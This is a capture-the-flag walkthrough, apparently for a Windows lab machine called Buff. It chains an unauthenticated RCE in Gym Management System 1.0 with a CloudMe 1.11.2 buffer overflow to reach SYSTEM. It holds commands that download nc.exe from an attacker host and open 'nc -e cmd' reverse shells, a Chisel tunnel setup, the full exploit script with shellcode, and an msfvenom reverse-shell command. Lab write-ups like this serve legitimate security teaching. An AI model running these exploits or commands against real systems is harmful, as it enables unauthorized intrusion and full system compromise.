1, Recon
port scan 
	7680/tcp pando-pub
	8080/tcp http

web-content scan 
![](images/Pasted%20image%2020240906081926.png)
	/license `GNU GENERAL PUBLIC LICENSE` 
	/README.md would be interesting. `gym management system`
By searching the exploit-db, we found:
`Gym Management System 1.0 - Unauthenticated Remote Code Execution`
`https://github.com/0xConstant/Gym-Management-1.0-unauthenticated-RCE.git`

Then we can use this script to upload a blind shell and we can enumerate the file path or make a reverse shell.
In this place, we have known it was a Windows os-system, so we need to use `nc64.exe` to handle our reverse shell.

```
curl "http://10.10.10.198:8080/upload/test.php?cmd=powershell%20InvokeWebRequest%20-Uri%20http%3A%2F%2F10.10.14.65%2Fnc64.exe%20-
Outfile%20c%3A%5Cusers%5Cpublic%5Cnc.exe"

powershell InvokeWebRequest -Uri http://10.10.14.65:80/nc64.exe -Outfile C:\users\public\nc.exe
```

Or we can just use the exploit script
```
#blind shell
curl -o \programdata\nc.exe http://10.10.14.65/nc.exe
\programdata\nc.exe -e cmd 10.10.14.65 4444
```

Then we can get a stable reverse shell for us.

3, shell as SYSTEM

Checking the netstate shows two ports listening only on localhost. 3306 is MySQL, which makes sense for the PHP site and XAmpp stack. The other is 8888:
```
netstat -ano | findstr TCP | findstr ":0"
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       944
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       6476
  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       448
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       4884
```

I’ll grab the process ID (2820) and grep (or findstr) for i in the tasklist (the listening process id changes every minute so I’ll have to search quickly):
```
tasklist /v | findstr 4884
httpd.exe                     4884                            0        148 K Unknown         BUFF\shaun 
```

Let's continue to enumerate the directory of shaun.
There is a useful file `Tasks.bat` in the `C:\Users\shaun\Documents\Tasks.bat`
and `CloudMe_1112.exe` in the `C:\Users\shaun\Downloads\CloudMe_1112.exe`

```
type Tasks.bat
START C:/xampp/xampp_start.exe
```

When we use search the `CloudMe` exploits in `searchsploit`

```
searchsploit CloudMe                   
---------------------------------------------------- ---------------------------------
 Exploit Title                                      |  Path
---------------------------------------------------- ---------------------------------
CloudMe 1.11.2 - Buffer Overflow (PoC)              | windows/remote/48389.py
CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR)     | windows/local/48499.txt
CloudMe 1.11.2 - Buffer Overflow ROP (DEP_ASLR)     | windows/local/48840.py
Cloudme 1.9 - Buffer Overflow (DEP) (Metasploit)    | windows_x86-64/remote/45197.rb
CloudMe Sync 1.10.9 - Buffer Overflow (SEH)(DEP Byp | windows_x86-64/local/45159.py
CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow ( | windows/remote/44175.rb
CloudMe Sync 1.11.0 - Local Buffer Overflow         | windows/local/44470.py
CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt     | windows/remote/46218.py
CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP By | windows_x86-64/remote/46250.py
CloudMe Sync < 1.11.0 - Buffer Overflow             | windows/remote/44027.py
CloudMe Sync < 1.11.0 - Buffer Overflow (SEH) (DEP  | windows_x86-64/remote/44784.py
---------------------------------------------------- ---------------------------------
```

I think it would be version `1112` == `CloudMe 1.11.2`

Tunnel
To exploit this service, I’ll need a tunnel from my box to Buff (or I’d have to run the exploit from Buff, but Python isn’t typically installed on Windows). I’ll use my favorite tool for this, Chisel. I’ll use the same SMB share and copy the Windows binary to where I’m staging in \programdata.

Now I’ll run the Linux binary on Kali in server mode:
`chisel server -p 8000 --reverse`
Next, from Buff, I’ll run as a client:
`.\c.exe client 10.10.14.20:8000 R:8888:localhost:8888`

I can see my local box is listening on 8888:
```
netstat -ntlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp6       0      0 :::8000                 :::*                    LISTEN      95516/chisel        
tcp6       0      0 :::8888                 :::*                    LISTEN      95516/chisel
```

Update Exploit
It looks like the exploit is a very simple buffer overflow:
```
# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
payload    = b"\xba\xad\x1e\x7c\x02\xdb\xcf\xd9\x74\x24\xf4\x5e\x33"
payload   += b"\xc9\xb1\x31\x83\xc6\x04\x31\x56\x0f\x03\x56\xa2\xfc"
payload   += b"\x89\xfe\x54\x82\x72\xff\xa4\xe3\xfb\x1a\x95\x23\x9f"
payload   += b"\x6f\x85\x93\xeb\x22\x29\x5f\xb9\xd6\xba\x2d\x16\xd8"
payload   += b"\x0b\x9b\x40\xd7\x8c\xb0\xb1\x76\x0e\xcb\xe5\x58\x2f"
payload   += b"\x04\xf8\x99\x68\x79\xf1\xc8\x21\xf5\xa4\xfc\x46\x43"
payload   += b"\x75\x76\x14\x45\xfd\x6b\xec\x64\x2c\x3a\x67\x3f\xee"
payload   += b"\xbc\xa4\x4b\xa7\xa6\xa9\x76\x71\x5c\x19\x0c\x80\xb4"
payload   += b"\x50\xed\x2f\xf9\x5d\x1c\x31\x3d\x59\xff\x44\x37\x9a"
payload   += b"\x82\x5e\x8c\xe1\x58\xea\x17\x41\x2a\x4c\xfc\x70\xff"
payload   += b"\x0b\x77\x7e\xb4\x58\xdf\x62\x4b\x8c\x6b\x9e\xc0\x33"
payload   += b"\xbc\x17\x92\x17\x18\x7c\x40\x39\x39\xd8\x27\x46\x59"
payload   += b"\x83\x98\xe2\x11\x29\xcc\x9e\x7b\x27\x13\x2c\x06\x05"
payload   += b"\x13\x2e\x09\x39\x7c\x1f\x82\xd6\xfb\xa0\x41\x93\xf4"
payload   += b"\xea\xc8\xb5\x9c\xb2\x98\x84\xc0\x44\x77\xca\xfc\xc6"
payload   += b"\x72\xb2\xfa\xd7\xf6\xb7\x47\x50\xea\xc5\xd8\x35\x0c"
payload   += b"\x7a\xd8\x1f\x6f\x1d\x4a\xc3\x5e\xb8\xea\x66\x9f"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))       

buf = padding1 + EIP + NOPS + payload + overrun 

try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,8888))
        s.send(buf)
except Exception as e:
        print(sys.exc_value)
```

Very simply, it opens a connect to the target on port 8888, it sends a buffer, and it’s done.

The buffer is made up of 1052 bytes of no-op (nop, padding), then the address of a push esp, ret gadget, some nops, the payload, and then some more filler.

Without looking at the binary, this suggests that the stack before and after user input is read looks like this:
![](images/Pasted%20image%2020240906103027.png)

Now when the function returns, it will go to to the gadget, which will push $esp to the stack (which will now be at the top of the nops before the payload), and then return, moving the instruction pointer, $eip, to the nops followed by the payload

The payload in the script by default looks to be the output of msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python. Given the four-byte addresses and references to ESP and EIP (as opposed to RSP and RIP), this is a 32-bit program.

I’ll use msfvenom to generate my own payload that will return a stageless (can catch with nc) reverse tcp shell:
`msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.65 LPORT=443 -b '\x00\x0A\x0D' -f python -v payload`

I changed the payload type (and included LHOST and LPORT needed for this payload), and I used the -v payload to set the output payload variable name so I can just paste it into the script.

Now I just run the exploit through the tunnel with nc waiting (work with either legacy Python or Python3):
`python3 cloudme-bof.py `

Then we get the SYSTEM shell.
